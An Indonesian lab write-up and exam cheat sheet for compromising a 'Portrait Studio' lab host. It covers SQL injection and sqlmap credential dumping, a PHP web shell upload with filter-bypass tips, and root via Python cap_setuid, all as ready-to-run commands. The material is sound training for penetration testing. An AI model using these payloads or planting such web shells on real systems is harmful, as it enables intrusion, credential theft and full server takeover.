# Write-Up Lab Portrait — Panduan Ujian Close Book

> **Ruang lingkup:** hanya untuk laboratorium atau sistem yang telah memberikan izin pengujian.

## 0. Cara Menggunakan Catatan Ini

Pelajari dokumen ini dalam tiga lapisan:

```text
Lapisan 1: hafalkan rantai serangan dan mnemonic.
Lapisan 2: hafalkan indikator berhasil pada setiap fase.
Lapisan 3: latih command pada Cheat Sheet 60 Detik.
```

---

## 1. Peta Serangan

| Komponen | Nilai |
|---|---|
| Target | `192.168.56.118:8080` |
| Aplikasi | Portrait Studio |
| Celah awal | SQL Injection pada login |
| Credential | `admin:AdminPortr417126` |
| Foothold | Upload web shell sebagai `www-data` |
| Privilege escalation | Python memiliki `cap_setuid=ep` |
| Akses akhir | `root` |

### Rantai Serangan

```text
Recon
→ SQL Injection
→ credential admin
→ upload PHP
→ RCE sebagai www-data
→ getcap
→ Python cap_setuid
→ root
```

### Mnemonic: R-S-U-C-R

```text
R = Recon
S = SQL Injection
U = Upload web shell
C = Capability
R = Root
```

### Checkpoint Ujian

| Fase | Indikator yang Dicari |
|---|---|
| Recon | `/administrator`, `/profile`, dan `/uploads` |
| SQLi | Database `portrait`, tabel `users`, credential admin |
| Upload | Web shell dapat dipanggil dari `/uploads` |
| RCE | `uid=33(www-data)` |
| Capability | `/usr/bin/python3.13 cap_setuid=ep` |
| Root | `uid=0(root)` dan `whoami` menghasilkan `root` |

---

# Fase 1 — Recon

## 2. Tujuan

Menemukan service web, halaman administrasi, fitur upload, dan lokasi file hasil upload.

## 3. Perintah Inti

```bash
TARGET="192.168.56.118"
WEB="http://192.168.56.118:8080"

nmap -Pn -sC -sV -p8080 "$TARGET"

dirsearch \
  -u "$WEB" \
  -e php
```

## 4. Indikator Berhasil

```text
/administrator  → login admin
/profile        → upload avatar
/uploads        → lokasi file upload
```

## 5. Mengapa Penting

```text
administrator = jalan menuju autentikasi
profile       = jalan menuju upload
uploads       = jalan menuju eksekusi file
```

---

# Fase 2 — SQL Injection

## 6. Tujuan

Membuktikan SQL Injection pada login dan memperoleh credential administrator.

## 7. Uji Login Bypass

Payload:

```sql
' OR '1'='1
```

Payload tersebut membuat kondisi autentikasi menjadi benar karena:

```text
'1'='1' selalu TRUE
```

## 8. Enumerasi SQLMap: D-T-D

Tetapkan endpoint:

```bash
LOGIN_URL="$WEB/administrator"
POST_DATA='username=admin&password=test'
```

Cari database:

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  --current-db
```

Hasil:

```text
portrait
```

Cari tabel:

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  --tables
```

Hasil penting:

```text
users
```

Dump credential:

```bash
sqlmap \
  -u "$LOGIN_URL" \
  --data="$POST_DATA" \
  -p username \
  --batch \
  -D portrait \
  -T users \
  --dump
```

Credential lab:

```text
Username : admin
Password : AdminPortr417126
```

### Rumus Hafalan SQLMap

```text
D-T-D
Database → Tables → Dump
```

---

# Fase 3 — Upload Web Shell

## 9. Tujuan

Mengubah akses administrator aplikasi menjadi command execution pada server.

## 10. Login dan Buka Profil

```text
URL      : http://192.168.56.118:8080/administrator
Username : admin
Password : AdminPortr417126
```

Buka:

```text
http://192.168.56.118:8080/profile
```

## 11. Membuat Web Shell

```bash
cat > cakgup.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
```

Upload melalui fitur avatar.

Apabila aplikasi memeriksa MIME type, uji:

```text
Content-Type: image/jpeg
```

Apabila ekstensi `.php` ditolak, uji nama file sesuai perilaku aplikasi, misalnya:

```text
cakgup.php.jpg
```

> Keberhasilan tidak ditentukan hanya oleh nama file. File harus tetap diproses sebagai PHP setelah diunggah.

## 12. Memvalidasi RCE

```bash
SHELL_URL="$WEB/uploads/cakgup.php"

curl -sG \
  --data-urlencode "cmd=id" \
  "$SHELL_URL"
```

Indikator:

```text
uid=33(www-data) gid=33(www-data)
```

## 13. Mengapa Penting

```text
Upload berhasil belum tentu RCE.
RCE baru terbukti ketika command sistem menghasilkan output.
```

---

# Fase 4 — Menemukan Capability Berbahaya

## 14. Tujuan

Mencari kesalahan konfigurasi lokal yang dapat menaikkan privilege tanpa memakai kernel exploit.

## 15. Enumerasi Identitas dan Sistem

```bash
curl -sG \
  --data-urlencode \
  "cmd=id; whoami; uname -a; cat /etc/os-release" \
  "$SHELL_URL"
```

## 16. Enumerasi Capability

```bash
curl -sG \
  --data-urlencode \
  "cmd=getcap -r / 2>/dev/null" \
  "$SHELL_URL"
```

Temuan kritis:

```text
/usr/bin/python3.13 cap_setuid=ep
```

Makna:

```text
Python boleh mengubah UID proses.
os.setuid(0) mengubah UID menjadi 0.
UID 0 adalah root.
```

### Rumus Hafalan

```text
Python + cap_setuid + os.setuid(0) = root
```

---

# Fase 5 — Root

## 17. Tujuan

Menjalankan proses Python dengan UID 0 dan membuktikan akses root.

## 18. Bukti Root melalui Web Shell

```bash
curl -sG \
  --data-urlencode \
  "cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"id; whoami\")'" \
  "$SHELL_URL"
```

Indikator:

```text
uid=0(root)
root
```

Payload inti untuk shell interaktif:

```bash
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```

Perbedaan:

```text
Web shell non-interaktif → gunakan os.system() untuk bukti.
Shell interaktif         → gunakan os.execl() untuk membuka shell.
```

---

# 19. Troubleshooting Inti

### Web shell menghasilkan `404`

Periksa nama file dan lokasi upload:

```bash
curl -i "$WEB/uploads/cakgup.php?cmd=id"
```

### File terunggah tetapi kode PHP tidak dieksekusi

Kemungkinan file disimpan sebagai gambar atau berada pada direktori yang tidak memproses PHP. Validasi URL hasil upload dan perilaku server.

### `getcap` tidak ditemukan

Coba lokasi umum:

```bash
/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
```

### Versi Python berbeda

Cari binary yang memiliki capability:

```bash
getcap -r / 2>/dev/null | grep -i python
```

Gunakan path yang muncul pada hasil, jangan mengasumsikan selalu `python3.13`.

---

# 20. Cleanup

Hapus web shell melalui fitur profil atau upload aplikasi.

Apabila penghapusan dilakukan dari server:

1. verifikasi document root;
2. hapus hanya file yang dibuat saat pengujian;
3. pastikan URL web shell tidak lagi dapat diakses.

---

# 21. Cheat Sheet 60 Detik

```bash
TARGET="192.168.56.118"
WEB="http://192.168.56.118:8080"
LOGIN_URL="$WEB/administrator"
POST_DATA='username=admin&password=test'

# 1. Recon
nmap -Pn -sC -sV -p8080 "$TARGET"
dirsearch -u "$WEB" -e php

# 2. SQLMap: D-T-D
sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch --current-db
sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch -D portrait --tables
sqlmap -u "$LOGIN_URL" --data="$POST_DATA" -p username --batch -D portrait -T users --dump

# 3. Upload PHP
echo '<?php system($_GET["cmd"]); ?>' > cakgup.php

# 4. RCE
SHELL_URL="$WEB/uploads/cakgup.php"
curl -sG --data-urlencode "cmd=id" "$SHELL_URL"

# 5. Capability
curl -sG --data-urlencode "cmd=getcap -r / 2>/dev/null" "$SHELL_URL"

# 6. Root
curl -sG --data-urlencode \
"cmd=/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system(\"id; whoami\")'" \
"$SHELL_URL"
```

---

# 22. Checklist Ujian

```text
[ ] Port 8080 ditemukan
[ ] /administrator ditemukan
[ ] SQL Injection tervalidasi
[ ] Database dan tabel berhasil dienumerasi
[ ] Credential admin diperoleh
[ ] Web shell berhasil diunggah
[ ] RCE terbukti sebagai www-data
[ ] Capability Python ditemukan
[ ] os.setuid(0) dijalankan
[ ] uid=0(root) terbukti
[ ] Web shell dibersihkan
```

## Kalimat Hafalan

```text
Cari admin, SQLi login, dump user, upload PHP,
cek getcap, Python setuid nol, lalu root.
```
